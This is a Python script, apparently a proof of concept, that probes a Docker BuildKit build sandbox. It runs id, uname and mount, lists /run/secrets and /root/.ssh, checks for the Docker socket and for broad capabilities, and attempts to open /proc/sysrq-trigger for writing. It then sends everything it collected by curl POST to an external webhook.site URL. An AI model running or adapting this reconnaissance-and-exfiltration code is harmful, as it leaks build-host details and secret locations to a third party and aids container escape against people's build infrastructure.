import os
import subprocess
import json

WEBHOOK_URL = "https://webhook.site/12f4cc8f-b5a9-4ab3-97ca-89cb72412e87"

def get_out(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode().strip()
    except: return "ERR"

def run_buildkit_poc():
    results = {
        "verdict": "SECURE",
        "env_context": "BUILDKIT_SANDBOX",
        "leaks": {},
        "system_info": {
            "user": get_out("id"),
            "kernel": get_out("uname -a"),
            "mounts": get_out("mount | grep ' / '")
        }
    }

    # 1. Проверка секретов Docker (самая частая дыра)
    # Если при сборке забыли --mount=type=secret, данные могут лежать здесь
    secret_paths = ["/run/secrets", "/run/secrets/token", "/root/.ssh"]
    for path in secret_paths:
        if os.path.exists(path):
            results["leaks"][f"secret_path_{path}"] = "EXISTS"
            try:
                results["leaks"][f"content_{path}"] = os.listdir(path) if os.path.isdir(path) else "READABLE"
            except: pass

    # 2. Проверка доступа к Docker Socket (если проброшен внутрь сборщика)
    docker_sock = "/var/run/docker.sock"
    if os.path.exists(docker_sock):
        results["leaks"]["docker_socket"] = "PRESENT_IN_BUILDER"
        results["verdict"] = "CRITICAL_VULNERABILITY"

    # 3. Попытка детекции привилегированных возможностей (Capabilities)
    # Если CapEff имеет много ffffff, то возможен побег
    caps = get_out("grep CapEff /proc/self/status")
    results["system_info"]["capabilities"] = caps

    # 4. Проверка записи в системные области (проверка RO/RW слоев)
    try:
        with open("/proc/sysrq-trigger", "w") as f:
            results["leaks"]["sysrq_write"] = "SUCCESS" # Это очень плохо для хоста
    except:
        results["leaks"]["sysrq_write"] = "DENIED"

    # Итоговый анализ
    if results["leaks"].get("docker_socket") or "ffffff" in caps.lower():
        results["verdict"] = "ESCAPED_OR_EXPOSED"
    elif results["leaks"]:
        results["verdict"] = "DATA_LEAK_DETECTED"

    # Отправка на вебхук
    print(f"[*] Analysis complete. Verdict: {results['verdict']}")
    subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
                    '-d', json.dumps(results), WEBHOOK_URL])

    return json.dumps(results, indent=2)

if __name__ == "__main__":
    print(run_buildkit_poc())
